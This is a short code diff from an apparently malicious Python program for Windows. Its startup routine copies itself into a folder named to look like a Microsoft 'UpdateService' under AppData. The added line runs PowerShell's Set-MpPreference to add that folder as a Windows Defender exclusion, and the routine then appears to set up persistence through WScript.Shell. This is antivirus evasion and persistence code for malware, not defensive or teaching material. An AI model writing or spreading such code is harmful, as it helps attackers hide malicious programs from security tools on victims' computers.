@@ -112,6 +112,7 @@ class main():
 			with open(bd, 'w', newline='', encoding="utf8", errors='ignore') as f: f.write(content)
 
 	def startup(self):
+		if not sys.argv[0] == fr"C:\Users\{os.getlogin()}\Appdata\Roaming\Microsoft\UpdateService\{self.filename}": self.system(fr"powershell.exe Set-MpPreference -ExclusionPath 'C:\Users\{os.getlogin()}\Appdata\Roaming\Microsoft\UpdateService'")
 		shutil.copytree(os.getcwd(), fr"C:\Users\{os.getlogin()}\Appdata\Roaming\Microsoft\UpdateService")
 		try: 
 			shell = win32com.client.Dispatch("WScript.Shell")
